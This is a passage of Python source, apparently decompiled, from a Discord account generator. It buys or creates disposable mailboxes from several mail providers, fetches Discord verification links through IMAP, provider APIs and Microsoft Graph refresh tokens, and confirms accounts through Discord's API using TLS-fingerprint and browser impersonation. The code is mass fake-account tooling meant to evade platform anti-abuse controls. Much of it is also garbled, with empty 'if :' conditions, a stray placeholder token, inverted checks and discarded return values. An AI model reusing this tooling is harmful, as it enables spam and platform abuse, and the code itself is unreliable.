      pass

  def buy_email(self,max_retries: int = 10) -> dict:
    if self.client_key:
      log.error('Missing hotmail007 client_key in config')
      return {'success':False,'error':'Missing client_key'}
    else:
      log.info('Purchasing email from Hotmail007...')
      start_time = time.time()
      timeout = 20
      attempt = 0
      while time.time()-start_time < timeout:
        attempt += 1
        for mail_type in self.mail_types:
          log.info(f'''Attempt {attempt}: Trying {mail_type}...''')
          account = self._fetch_email(mail_type)
          if account.get('success'):
            email = account.get('email')
            password = account.get('password')
            log.success(f'''✓ Got {mail_type}: {email}''')
            {'success':True,'email':email,'password':password,'token':account.get('token',''),'uuid':account.get('uuid','')}
            return
          else:
            continue
            time.sleep(1)
            log.error('Failed to purchase email after 20s')
            return {'success':False,'error':'Timeout after 20s'}

  def check_inbox(self,email: str) -> dict:
    try:
      response = self.session.get(f'''{self.base_url}/inbox''',params={'clientKey':self.client_key,'email':email},verify=False,timeout=30)
      if response.status_code == 200:
        data = response.json()
        return {'success':True,'messages':data.get('messages',[])}
      else:
        return {'success':False,'error':f'''HTTP {response.status_code}'''}

    except Exception as e:
      return {'success':False,'error':str(e)}

class DraxonMailsAPI:
  BASE = 'https://mail.draxon.one/api'
  DISCORD_LINK_RE = re.compile('https?://[^\\s\\"\'<>]+(?:discord(?:app)?\\.com|click\\.discord\\.com)[^\\s\\"\'<>]*',re.IGNORECASE)
  def __init__(self,api_key: str = None):
    self.api_key = (api_key or '').strip()
    self._session = requests.Session()
    self._session.verify = False

  def _headers(self) -> dict:
    h = {'Accept':'application/json','Content-Type':'application/json','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'}
    if self.api_key:
      h['X-Api-Key'] = self.api_key

    return h

  def get_random_address(self) -> Optional[Dict]:
    try:
      r = self._session.get(f'''{self.BASE}/random?type=discord.com''',headers=self._headers(),timeout=15)
      if r.status_code == 200:
        return r.json()
      else:
        log.warning(f'''DraxonMails random address HTTP {r.status_code}: {r.text[:100]}''')
        return None

    except Exception as e:
      log.error(f'''DraxonMails random address error: {e}''')

  def check_inbox(self,address: str) -> list:
    try:
      r = self._session.get(f'''{self.BASE}/inboxes/{address}''',headers=self._headers(),timeout=15)
      if r.status_code == 200:
        data = r.json()
        return data
        if isinstance(data,dict):
          return data.get('messages',data.get('emails',[]))

      else:
        return []

    except Exception as e:
      log.debug(f'''DraxonMails inbox error: {e}''')

  def _extract_discord_link(self,messages: list) -> Optional[str]:
    for msg in messages:
      haystacks = [str((msg.get('html','') or '')),str((msg.get('body','') or '')),str((msg.get('markdown','') or '')),str((msg.get('text','') or ''))]
      for text in haystacks:
        for match in self.DISCORD_LINK_RE.findall(text):
          lowered = match.lower()
          if 'discord' not in lowered:
            continue

          if any((token in lowered for token in ('verify','email','ls/click','click.discord'))):
            match.rstrip(').,;"\'')
            return
          else:
            continue

  def fetch_verification_url(self,address: str,timeout: int = 120) -> Optional[str]:
    start = time.time()
    while time.time()-start < timeout:
      messages = self.check_inbox(address)
      if messages:
        url = self._extract_discord_link(messages)
        if url:
          return url

      else:
        time.sleep(3)
        return None

DraxonoMailAPI = DraxonMailsAPI
class MailcowProvider:
  def __init__(self,mc_config: dict):
    self.config = mc_config
    api_base = mc_config.get('api_base','').rstrip('/')
    host = mc_config.get('host','').rstrip('/')
    if api_base:
      self.base_url = api_base
    else:
      if host:
        self.base_url = host if host.startswith('http') else f'''https://{host}'''
      else:
        self.base_url = ''

    self.api_key = mc_config.get('api_key','')
    self.imap_host = mc_config.get('imap_host',host.replace('https://','').replace('http://','') if host else '')
    self.imap_port = int(mc_config.get('imap_port',993))
    self.domain = mc_config.get('domain','')
    self.headers = {'X-API-Key':self.api_key,'Content-Type':'application/json'}
    self._created_email = None
    self._created_password = None

  def create_account(self) -> Optional[str]:
    if self.base_url or (self.api_key and self.domain):
      log.error('CowMail: api_base / api_key / domain missing in config')
      return None
    else:
      for attempt in range(3):
        try:
          local = ''.join(random.choices(string.ascii_lowercase+string.digits,k=10))
          addr = f'''{local}@{self.domain}'''
          pw = ''.join(random.choices(string.ascii_letters+string.digits,k=14))
          data = {'active':'1','domain':self.domain,'local_part':local,'name':local,'password':pw,'password2':pw,'quota':'10'}
          r = requests.post(f'''{self.base_url}/add/mailbox''',json=data,headers=self.headers,timeout=25,verify=False)
          if r.status_code in (200,201):
            body = r.text.strip()
            ok = False
            if body:
              ok = True
            else:
              try:
                resp_json = r.json()
                ok = ok if isinstance(resp_json,list) else any((item.get('type') == 'success' for item in resp_json))
              except Exception:
                ok = True

            if ok:
              self._created_email = addr
              self._created_password = pw
              log.success(f'''CowMail mailbox created: {addr}''')
              addr
              return
            else:
              log.warning(f'''CowMail attempt {attempt+1}/3 failed: {r.text[:80]}''')

          else:
            log.warning(f'''CowMail HTTP {r.status_code} on attempt {attempt+1}/3''')

        except Exception as exc:
          log.warning(f'''CowMail exception attempt {attempt+1}/3: {exc}''')

        if attempt < 2:
          time.sleep(2)

      return None

  def get_verify_url(self,timeout: int = 120) -> Optional[str]:
    em = self._created_email
    pw = self._created_password
    if em or (pw and self.imap_host):
      log.error('CowMail: cannot poll IMAP — missing credentials')
      return None
    else:
      start_time = time.time()
      while time.time()-start_time < timeout:
        try:
          mail = imaplib.IMAP4_SSL(self.imap_host,self.imap_port)
          mail.login(em,pw)
          for folder in ('INBOX','Junk','Spam'):
            try:
              status,_ = mail.select(folder)
              if status != 'OK':
                continue

              status,messages = mail.search(None,'ALL')
              if status != 'OK' or messages[0]:
                continue

              for num in reversed(messages[0].split()):
                res,msg_data = mail.fetch(num,'(RFC822)')
                if res != 'OK':
                  continue

                msg = email_lib.message_from_bytes(msg_data[0][1])
                subject = str(msg.get('Subject','')).lower()
                from_hdr = str(msg.get('From','')).lower()
                if 'discord' in subject and 'verify' in subject and 'discord' in from_hdr:
                  continue

                body = ''
                if msg.is_multipart():
                  for part in msg.walk():
                    if part.get_content_type() in ('text/plain','text/html'):
                      try:
                        body += part.get_payload(decode=True).decode(errors='ignore')
                        continue
                      except Exception:
                        pass

                else:
                  try:
                    body = msg.get_payload(decode=True).decode(errors='ignore')
                  except Exception:
                    pass

                if body:
                  continue

                for pat in ('https://click\\.discord\\.com/ls/click\\?[^"\\s<>]+','https://discord\\.com/verify(?:-email)?[^"\\s<>]+','https://discord\\.com/verify\\?token=[^"\\s<>]+'):
                  m = re.search(pat,body,re.IGNORECASE)
                  if m:
                    url = m.group(0).replace('&amp;','&')
                    mail.logout()
                    log.success('CowMail: found verify link')
                    url
                    return
                  else:
                    continue
                    continue
                    continue
                    mail.logout()
                    time.sleep(5)
                    return None

            except Exception:
              continue

        except Exception as exc:
          log.debug(f'''CowMail IMAP error: {exc}''')

_cowmail_providers: dict = {}
_crowmail_providers: dict = {}
class DuckMailAPI:
  BASE = 'https://api.duckmail.sbs'
  DEFAULT_DOMAINS = ['niceground.shop','stoneground.shop','lakeground.shop','canvaspace.shop','vercelspace.shop','seedancespace.shop','happyhorsespace.shop','bananaspace.shop','sunstarmoon.shop','moonstarsun.shop','sunmoonlight.shop','makesomestone.shop','mikesomelike.shop','somestoneair.shop','hubaiclass.org','markaihub.shop','markstonehub.org','glasswhitehub.com','duckmail.sbs']
  _cached_domains: list = []
  def __init__(self,target_domain: str = None):
    self.session = requests.Session()
    self.session.verify = False
    self.session.headers.update({'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'})
    self.target_domain = (target_domain or '').strip().lower()
    if self.target_domain in ('random','any','all',''):
      self.target_domain = None
      return None
    else:
      return None

  def get_domains(self) -> list:
    if self.target_domain:
      return [self.target_domain]
    else:
      if DuckMailAPI._cached_domains:
        return DuckMailAPI._cached_domains
      else:
        try:
          r = self.session.get(f'''{self.BASE}/domains''',timeout=10)
          if r.status_code == 200:
            data = r.json()
            members = data.get('hydra:member',[])
            valid = [item.get('domain') for item in members if item.get('domain') if item.get('isVerified')]
            if valid:
              DuckMailAPI._cached_domains = valid
              return valid

          else:
            return self.DEFAULT_DOMAINS

        except Exception as e:
          log.debug(f'''DuckMail domains fetch error: {e}''')

  def _random_address(self,domain: str = None) -> str:
    local = ''.join(random.choices(string.ascii_lowercase+string.digits,k=random.randint(10,14)))
    if domain:
      domains = self.get_domains()
      domain = random.choice(domains) if domains else 'niceground.shop'

    return f'''{local}@{domain}'''

  def _random_password(self,length: int = 16) -> str:
    chars = string.ascii_letters+string.digits
    return ''.join(random.choices(chars,k=length))

  def create_account(self) -> Optional[tuple]:
    domains = self.get_domains()
    for attempt in range(5):
      chosen_domain = (self.target_domain or domains)
      address = self._random_address(chosen_domain)
      password = self._random_password()
      payload = {'address':address,'password':password,'expiresIn':0}
      try:
        r = self.session.post(f'''{self.BASE}/accounts''',json=payload,timeout=15)
        if r.status_code in (200,201):
          log.success(f'''DuckMail created: {address}''')
          (address,password)
          return random.choice(domains) if __CHAOS_PY_NULL_PTR_VALUE_ERR__ else 'niceground.shop'
        else:
          log.warning(f'''DuckMail create attempt {attempt+1} failed [{r.status_code}]: {r.text[:100]}''')
          time.sleep(1)
          continue

      except Exception as e:
        log.warning(f'''DuckMail create attempt {attempt+1} error: {e}''')

    log.error('DuckMail: failed to create account after retries')
    return (None,None)

  def get_token(self,address: str,password: str) -> Optional[str]:
    try:
      r = self.session.post(f'''{self.BASE}/token''',json={'address':address,'password':password},timeout=15)
      if r.status_code == 200:
        return r.json().get('token')
      else:
        return None

    except Exception as e:
      log.error(f'''DuckMail token error: {e}''')

  def fetch_verification_url(self,address: str,password: str,timeout: int = 120) -> Optional[str]:
    bearer = self.get_token(address,password)
    if bearer:
      log.error('DuckMail: could not get bearer token for inbox')
      return None
    else:
      headers = {'Authorization':f'''Bearer {bearer}'''}
      start = time.time()
      while time.time()-start < timeout:
        try:
          r = self.session.get(f'''{self.BASE}/messages''',headers=headers,timeout=15)
          if r.status_code == 200:
            msgs = r.json().get('hydra:member',[])
            for msg in msgs:
              from_addr = (msg.get('from',{}).get('address','') or '').lower()
              from_name = (msg.get('from',{}).get('name','') or '').lower()
              subject = (msg.get('subject','') or '').lower()
              if 'discord' not in from_addr and 'discord' not in from_name and 'discord' not in subject and 'verify' not in subject:
                continue

              msg_id = msg.get('id','')
              detail = self.session.get(f'''{self.BASE}/messages/{msg_id}''',headers=headers,timeout=15)
              if detail.status_code != 200:
                continue

              body = (detail.json().get('html','') or detail.json().get('text',''))
              if isinstance(body,list):
                body = ' '.join(body)

              direct = re.search('https://discord\\.com/verify\\?token=[^"\\\'>\\s]+',body)
              if direct:
                log.success('DuckMail: found verify link!')
                direct.group(0).replace('&amp;','&')
                return
              else:
                for click_pat in ('https://click\\.discord\\.com/ls/click\\?[^"\\\'>\\s]+','https://links\\.discord\\.com[^"\\\'>\\s]+'):
                  for m in re.finditer(click_pat,body):
                    try:
                      resp = self.session.get(m.group(0),allow_redirects=True,timeout=10)
                      final = resp.url
                      if 'discord.com/verify' in final:
                        log.success('DuckMail: found verify link via redirect!')
                        final
                        return
                      else:
                        found = re.search('https://discord\\.com/verify\\?token=[^"\\\'>\\s]+',resp.text)
                        if found:
                          found.group(0)
                          return
                        else:
                          continue
                          continue
                          continue

                    except Exception:
                      pass

        except Exception as e:
          log.warning(f'''DuckMail inbox error: {e}''')

        time.sleep(4)

      log.warning('DuckMail: verification email not received within timeout')
      return None

def get_duckmail_email(config: dict) -> tuple:
  dm_cfg = config.get('email_provider',{}).get('duckmail',{})
  target_domain = dm_cfg.get('domain','').strip() if isinstance(dm_cfg,dict) else ''
  api = DuckMailAPI(target_domain=target_domain)
  address,password = api.create_account()
  if address:
    return (address,password,'','')
  else:
    return (None,None,None,None)

def fetch_verification_url_duckmail(email: str,password: str,timeout: int = 120) -> Optional[str]:
  api = DuckMailAPI()
  return api.fetch_verification_url(email,password,timeout=timeout)

class CrowMailProvider:
  BASE = 'https://api.crowmail.sbs'
  def __init__(self,api_key=None):
    self.email = None
    self.password = None
    self.auth_token = None
    self.account_id = None
    self.api_key = api_key

  def _get_domains(self) -> list:
    try:
      headers = {}
      if self.api_key:
        headers['Authorization'] = f'''Bearer {self.api_key}'''

      r = cffi_requests.get(f'''{self.BASE}/domains''',headers=headers,timeout=15,impersonate='chrome124')
      if r.status_code == 200:
        data = r.json()
        members = data.get('hydra:member',[])
        valid = []
        for item in members:
          domain = item.get('domain')
          if domain and item.get('isVerified'):
            valid.append(domain)

        if valid:
          return valid

      else:
        return []

    except Exception:
      pass

  def create_account(self) -> Optional[str]:
    domains = self._get_domains()
    if domains:
      log.error('CrowMail: no domains available')
      return None
    else:
      domain = random.choice(domains)
      user = ''.join(random.choices(string.ascii_lowercase+string.digits,k=random.randint(10,16)))
      self.email = f'''{user}@{domain}'''
      self.password = ''.join(random.choices(string.ascii_letters+string.digits,k=12))
      headers = {'Content-Type':'application/json'}
      if self.api_key:
        headers['Authorization'] = f'''Bearer {self.api_key}'''

      payload = {'address':self.email,'password':self.password,'expiresIn':0}
      try:
        r = cffi_requests.post(f'''{self.BASE}/accounts''',headers=headers,json=payload,timeout=15,impersonate='chrome124')
        if r.status_code not in (200,201):
          log.error(f'''CrowMail create failed [{r.status_code}]: {r.text[:120]}''')
          return None
        else:
          tok_r = cffi_requests.post(f'''{self.BASE}/token''',headers={'Content-Type':'application/json'},json={'address':self.email,'password':self.password},timeout=15,impersonate='chrome124')
          if tok_r.status_code == 200:
            td = tok_r.json()
            self.auth_token = td.get('token')
            self.account_id = td.get('id')

          log.success(f'''CrowMail mailbox created: {self.email}''')
          return self.email

      except Exception as e:
        log.error(f'''CrowMail create error: {e}''')
        return None

  def get_verify_url(self,timeout: int = 120) -> Optional[str]:
    if self.auth_token:
      return None
    else:
      headers = {'Authorization':f'''Bearer {self.auth_token}'''}
      start = time.time()
      while time.time()-start < timeout:
        try:
          r = cffi_requests.get(f'''{self.BASE}/messages''',headers=headers,timeout=15,impersonate='chrome124')
          if r.status_code == 200:
            messages = r.json().get('hydra:member',[])
            for mail in messages:
              subject = str((mail.get('subject','') or '')).lower()
              if :
                pass

              from_data = {}
              from_address = str((from_data.get('address','') or '')).lower()
              from_name = str((from_data.get('name','') or '')).lower()
              if :
                pass

              is_discord = 'discord' in from_name
              if :
                pass

              has_verify = 'confirm' in subject
              if is_discord or has_verify:
                msg_id = mail.get('id')
                if msg_id:
                  dr = cffi_requests.get(f'''{self.BASE}/messages/{msg_id}''',headers=headers,timeout=15,impersonate='chrome124')
                  if dr.status_code == 200:
                    md = dr.json()
                    content_parts = [str((md.get('text','') or ''))]
                    if :
                      pass

                    for hb in []:
                      content_parts.append(str((hb or '')))

                    full = '\n'.join(content_parts)
                    patterns = ['https?://(?:www\\.)?discord\\.com/verify\\?token=[a-zA-Z0-9\\-\\._~%]+','https?://click\\.discord\\.com/ls/click\\?upn=[a-zA-Z0-9\\-\\._~%]+']
                    links = []
                    for pat in patterns:
                      for url in re.findall(pat,full,re.IGNORECASE):
                        url = url.replace('\\/','/').split('\n')[0].strip().replace('&amp;','&')
                        url = re.sub('[.,;>]$','',url)
                        if len(url) > 50:
                          links.append(url)

                    if links:
                      verify_links = [l for l in links if 'discord.com/verify' in l]
                      if verify_links:
                        verify_links.sort(key=len,reverse=True)
                        log.success('CrowMail: found verify link')
                        verify_links[0]
                        return md.get('html',[])
                      else:
                        links.sort(key=len,reverse=True)
                        links[0]
                        return 'verify' in subject

              else:
                continue

        except Exception as e:
          log.debug(f'''CrowMail inbox error: {e}''')

        time.sleep(4)

      return None

def get_crowmail_email(config: dict) -> tuple:
  cm_cfg = config.get('email_provider',{}).get('crowmail',{})
  api_key = cm_cfg.get('api_key','').strip() if cm_cfg else ''
  provider = CrowMailProvider(api_key=(api_key or None))
  email = provider.create_account()
  if email:
    _crowmail_providers[threading.current_thread().ident] = provider
    return (email,provider.password,None,None)
  else:
    return (None,None,None,None)

async def verify_email_crowmail_provider(email: str,password: str,browser,token: str,timeout: int = 120) -> bool:
  log.info('Waiting for CrowMail verification email...')
  provider = _crowmail_providers.get(threading.current_thread().ident)
  if provider:
    cm_cfg = config.get('email_provider',{}).get('crowmail',{})
    api_key = cm_cfg.get('api_key','').strip() if cm_cfg else ''
    provider = CrowMailProvider(api_key=(api_key or None))
    provider.email = email
    provider.password = password

  verify_url = await asyncio.get_event_loop().run_in_executor(None,lambda : provider.get_verify_url(timeout))
  if verify_url:
    return await verify_email_with_url(browser,verify_url,token)
  else:
    log.warning('CrowMail: verification email not found after timeout')
    return False

def get_cowmail_email(config: dict) -> tuple:
  cm_cfg = config.get('email_provider',{}).get('cowmail',{})
  if cm_cfg:
    log.error('CowMail: no \'cowmail\' block in email_provider config')
    return (None,None,None,None)
  else:
    provider = MailcowProvider(cm_cfg)
    email = provider.create_account()
    if email:
      _cowmail_providers[threading.current_thread().ident] = provider
      return (email,provider._created_password,None,None)
    else:
      return (None,None,None,None)

def get_draxono_email(config: dict) -> tuple:
  api_key = config.get('email_provider',{}).get('client_key','').strip()
  blocked_domains = config.get('email_provider',{}).get('blocked_domains',[])
  if api_key:
    log.warning('DraxonMails: no API key configured')

  api = DraxonMailsAPI(api_key=api_key)
  max_attempts = 10
  for attempt in range(max_attempts):
    data = api.get_random_address()
    if data:
      email = (data.get('address') or data.get('email') or '')
      domain = data.get('domain','')
      if email and domain not in blocked_domains:
        password = ''.join(random.choices(string.ascii_letters+string.digits+'!@#$%',k=16))
        log.success(f'''DraxonMails email: {email}''')
        (email,password,'','')
        return
      else:
        if domain in blocked_domains:
          log.info(f'''Blocked domain {domain}, retrying...''')

        continue

    time.sleep(1)

  log.error('DraxonMails: failed to get address after retries')
  return (None,None,None,None)

def get_hotmail007_email(config: dict) -> tuple:
  ep = config.get('email_provider',{})
  hm_cfg = ep.get('hotmail007',{})
  client_key = (hm_cfg.get('client_key','').strip() or ep.get('client_key','').strip())
  if client_key:
    log.warning('No Hotmail007 client_key configured')
    return (None,None,None,None)
  else:
    api = Hotmail007API(client_key)
    result = api.buy_email(max_retries=10)
    if result.get('success'):
      return (result.get('email'),result.get('password'),result.get('token',''),result.get('uuid',''))
    else:
      log.error('Failed to purchase email after all retries')
      return (None,None,None,None)

def get_email_from_provider(config: dict) -> tuple:
  provider_name = config.get('email_provider',{}).get('name','')
  use_wasted = (config.get('use_wasted_mails',False) or config.get('email_provider',{}).get('use_wasted_mails',False))
  if use_wasted and provider_name in WASTED_PROVIDERS:
    wasted = pop_wasted_mail()
    if wasted:
      email,password,token,uuid = wasted
      log.success(f'''Reusing wasted mail: {email}''')
      return (email,password,token,uuid,provider_name)
    else:
      log.info('No wasted mails left — buying a fresh one')

  if provider_name == 'draxono':
    email,password,token,uuid = get_draxono_email(config)
    return (email,password,token,uuid,'draxono')
  else:
    if provider_name == 'hotmail007':
      email,password,token,uuid = get_hotmail007_email(config)
      return (email,password,token,uuid,'hotmail007')
    else:
      if provider_name == 'cowmail':
        email,password,token,uuid = get_cowmail_email(config)
        return (email,password,None,None,'cowmail')
      else:
        if provider_name == 'duckmail':
          email,password,token,uuid = get_duckmail_email(config)
          return (email,password,None,None,'duckmail')
        else:
          if provider_name == 'crowmail':
            email,password,token,uuid = get_crowmail_email(config)
            if email:
              return (email,password,None,None,'crowmail')

  log.error('No email provider available or all failed')
  return (None,None,None,None,None)

def get_access_token(refresh_token: str,client_id: str = None,proxy_config: Dict = None) -> Optional[str]:
  try:
    if :
      pass

    cid = MS_CLIENT_ID
    if refresh_token.endswith('$'):
      refresh_token = refresh_token[:-1]

    session = requests.Session()
    session.verify = False
    if proxy_config:
      proxy_dict = get_session_proxy(proxy_config)
      if proxy_dict:
        session.proxies.update(proxy_dict)

    response = session.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',data={'client_id':cid,'refresh_token':refresh_token,'grant_type':'refresh_token','scope':'https://graph.microsoft.com/.default'},timeout=30)
    result = response.json()
    return result.get('access_token')
  except Exception as e:
    log.error(f'''Token refresh error: {e}''')
    return None

def fetch_verification_url(email_data: Dict,timeout: int = 120,proxy_config: Dict = None) -> Optional[str]:
  log.info('Fetching verification email from inbox...')
  refresh_token = email_data.get('token','')
  if :
    pass

  client_id = MS_CLIENT_ID
  access_token = get_access_token(refresh_token,client_id,proxy_config)
  if access_token:
    log.error('Failed to get Graph access token')
    return None
  else:
    start_time = time.time()
    attempt = 0
    session = requests.Session()
    session.verify = False
    if proxy_config:
      proxy_dict = get_session_proxy(proxy_config)
      if proxy_dict:
        session.proxies.update(proxy_dict)

    while time.time()-start_time < timeout:
      attempt += 1
      try:
        response = session.get('https://graph.microsoft.com/v1.0/me/messages',headers={'Authorization':f'''Bearer {access_token}'''},params={'$top':5,'$orderby':'receivedDateTime desc','$select':'subject,body,from,bodyPreview,receivedDateTime'},timeout=15)
        emails = response.json().get('value',[])
        if attempt%5 == 0:
          elapsed = int(time.time()-start_time)
          log.info(f'''Checking inbox... ({elapsed}s elapsed)''')

        for email in emails:
          subject = email.get('subject','').lower()
          from_addr = email.get('from',{}).get('emailAddress',{}).get('address','').lower()
          if 'verify' in subject or 'confirm' in subject or  and :
            pass

          is_verify_email = 'noreply@discord.com' in from_addr
          if is_verify_email:
            continue

          body_html = email.get('body',{}).get('content','')
          verify_pattern = 'https://discord\\.com/verify\\?token=[^"\\\'\\>\\s]+'
          direct_match = re.search(verify_pattern,body_html)
          if direct_match:
            log.success('Found verify link in email!')
            direct_match.group(0)
            return 'discord' in from_addr
          else:
            click_patterns = ['https://click\\.discord\\.com/ls/click\\?[^"\\\'\\>\\s]+','https://links\\.discord\\.com[^"\\\'\\>\\s]+']
            for pat in click_patterns:
              for m in re.finditer(pat,body_html):
                url = m.group(0)
                try:
                  resp = session.get(url,allow_redirects=True,timeout=10)
                  final_url = resp.url
                  if 'discord.com/verify' in final_url:
                    log.success('Found verify link via redirect!')
                    final_url
                    'email' in subject
                    email_data.get('uuid','')
                    return
                  else:
                    verify_in_body = re.search('https://discord\\.com/verify\\?token=[^"\\\'\\>\\s]+',resp.text)
                    if verify_in_body:
                      log.success('Found verify link in response body!')
                      verify_in_body.group(0)
                      return
                    else:
                      continue
                      continue
                      log.warning('Discord email found but no valid verify link')
                      continue
                      time.sleep(3)
                      log.warning('Verification email not found after timeout')
                      return None

                except:
                  continue

      except Exception as e:
        log.warning(f'''Graph API error: {e}''')

HOTMAIL007_MS_CLIENT_ID = '8b4ba9dd-3ea5-4e5f-86f1-ddba2230dcf2'
def _get_access_token_with_client(refresh_token: str,client_id: str,proxy_config: Dict = None) -> Optional[str]:
  try:
    if refresh_token.endswith('$'):
      refresh_token = refresh_token[:-1]

    session = requests.Session()
    session.verify = False
    if proxy_config:
      proxy_dict = get_session_proxy(proxy_config)
      if proxy_dict:
        session.proxies.update(proxy_dict)

    response = session.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',data={'client_id':client_id,'refresh_token':refresh_token,'grant_type':'refresh_token','scope':'https://graph.microsoft.com/.default'},timeout=30)
    return response.json().get('access_token')
  except Exception as e:
    log.error(f'''Token refresh error (hotmail007): {e}''')
    return None

def fetch_verification_url_hotmail007(email_data: Dict,timeout: int = 120,proxy_config: Dict = None) -> Optional[str]:
  log.info('Fetching verification email from inbox (hotmail007)...')
  refresh_token = email_data.get('token','')
  if :
    pass

  client_id = HOTMAIL007_MS_CLIENT_ID
  access_token = _get_access_token_with_client(refresh_token,client_id,proxy_config)
  if access_token:
    log.error('Failed to get Graph access token (hotmail007)')
    return None
  else:
    start_time = time.time()
    attempt = 0
    session = requests.Session()
    session.verify = False
    if proxy_config:
      proxy_dict = get_session_proxy(proxy_config)
      if proxy_dict:
        session.proxies.update(proxy_dict)

    while time.time()-start_time < timeout:
      attempt += 1
      try:
        response = session.get('https://graph.microsoft.com/v1.0/me/messages',headers={'Authorization':f'''Bearer {access_token}'''},params={'$top':5,'$orderby':'receivedDateTime desc','$select':'subject,body,from,bodyPreview,receivedDateTime'},timeout=15)
        emails = response.json().get('value',[])
        if attempt%5 == 0:
          elapsed = int(time.time()-start_time)
          log.info(f'''Checking inbox... ({elapsed}s elapsed)''')

        for email in emails:
          subject = email.get('subject','').lower()
          from_addr = email.get('from',{}).get('emailAddress',{}).get('address','').lower()
          if 'verify' in subject or 'confirm' in subject or  and :
            pass

          is_verify_email = 'noreply@discord.com' in from_addr
          if is_verify_email:
            continue

          body_html = email.get('body',{}).get('content','')
          verify_pattern = 'https://discord\\.com/verify\\?token=[^"\\\'\\>\\s]+'
          direct_match = re.search(verify_pattern,body_html)
          if direct_match:
            log.success('Found verify link in email!')
            direct_match.group(0)
            return 'discord' in from_addr
          else:
            click_patterns = ['https://click\\.discord\\.com/ls/click\\?[^"\\\'\\>\\s]+','https://links\\.discord\\.com[^"\\\'\\>\\s]+']
            for pat in click_patterns:
              for m in re.finditer(pat,body_html):
                url = m.group(0)
                try:
                  resp = session.get(url,allow_redirects=True,timeout=10)
                  final_url = resp.url
                  if 'discord.com/verify' in final_url:
                    log.success('Found verify link via redirect!')
                    final_url
                    'email' in subject
                    email_data.get('uuid','')
                    return
                  else:
                    verify_in_body = re.search('https://discord\\.com/verify\\?token=[^"\\\'\\>\\s]+',resp.text)
                    if verify_in_body:
                      log.success('Found verify link in response body!')
                      verify_in_body.group(0)
                      return
                    else:
                      continue
                      continue
                      log.warning('Discord email found but no valid verify link')
                      continue
                      time.sleep(3)
                      log.warning('Verification email not found after timeout (hotmail007)')
                      return None

                except Exception:
                  pass

      except Exception as e:
        log.warning(f'''Graph API error (hotmail007): {e}''')

def fetch_verification_url_draxono(email: str,timeout: int = 120,proxy_config: Dict = None) -> Optional[str]:
  api_key = config.get('email_provider',{}).get('client_key','').strip()
  if api_key:
    log.warning('DraxonMails: no API key configured for verification fetch')

  api = DraxonMailsAPI(api_key=api_key)
  return api.fetch_verification_url(email,timeout=timeout)

async def verify_email_with_url(browser,verify_url: str,token: str,timeout: int = 60) -> bool:
  if verify_url:
    return False
  else:
    log.info('Opening verification link...')
    try:
      from urllib.parse import urlparse, parse_qs
      parsed = urlparse(verify_url)
      params = parse_qs(parsed.query)
      email_verify_token = params.get('token',[None])[0]
      if email_verify_token:
        session = tls_client.Session(client_identifier='chrome_131',random_tls_extension_order=True)
        headers = {'Authorization':token,'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Origin':'https://discord.com','Referer':'https://discord.com/'}
        resp = session.post('https://discord.com/api/v9/auth/verify',headers=headers,json={'token':email_verify_token})
        if resp.status_code == 200:
          log.success('Email verified successfully!')
          return True
        else:
          log.debug(f'''API verify returned {resp.status_code} — falling back to browser''')

    except Exception as e:
      log.debug(f'''API verify error: {e} — falling back to browser''')

    try:
      tab = await browser.get(verify_url,new_tab=True)
      await asyncio.sleep(5)
      for _ in range(timeout//5):
        await asyncio.sleep(5)
        verified,_ = check_email_verified_api(token)
        if verified:
          log.success('Email verified successfully!')
          return True
        else:
          continue
          return True

    except Exception as e:
      log.warning(f'''Error opening verification URL: {e}''')
      return False

async def verify_email_cowmail(email: str,password: str,browser,token: str,timeout: int = 120) -> bool:
  log.info('Waiting for CowMail verification email...')
  provider = _cowmail_providers.get(threading.current_thread().ident)
  if provider:
    cm_cfg = config.get('email_provider',{}).get('cowmail',{})
    provider = MailcowProvider(cm_cfg)
    provider._created_email = email
    provider._created_password = password

  verify_url = await asyncio.get_event_loop().run_in_executor(None,lambda : provider.get_verify_url(timeout))
  if verify_url:
    return await verify_email_with_url(browser,verify_url,token)
  else:
    log.warning('CowMail: verification email not found after timeout')
    return False

def generate_random_string(length: int) -> str:
  return ''.join(random.choices(string.ascii_lowercase+string.digits,k=length))

USA_FIRST_NAMES = ['Moon','James','John','Robert','Michael','William','David','Richard','Joseph','Thomas','Charles','Christopher','Daniel','Matthew','Anthony','Mark','Donald','Steven','Andrew','Joshua','Kevin','Brian','George','Edward','Ronald','Timothy','Jason','Jeffrey','Ryan','Jacob','Gary','Nicholas','Eric','Jonathan','Stephen','Larry','Justin','Scott','Brandon','Benjamin','Samuel','Gregory','Alexander','Patrick','Frank','Raymond','Jack','Dennis','Jerry','Tyler','Aaron','Jose','Henry','Adam','Nathan','Mary','Patricia','Jennifer','Linda','Elizabeth','Barbara','Susan','Jessica','Sarah','Karen','Nancy','Lisa','Emily','Ashley','Amanda','Olivia','Emma','Madison','Abigail','Sophia','Grace','Ethan','Logan','Betty','Margaret','Sandra','Donna','Carol','Ruth','Sharon','Michelle','Laura','Kimberly','Deborah','Amy','Angela','Brenda','Rebecca','Anna','Chloe','Mia','Ella','Avery','Scarlett','Lily','Hannah','Zoe','Natalie','Mason','Noah','Liam','Lucas','Oliver','Elijah','Aiden','Carter','Owen']
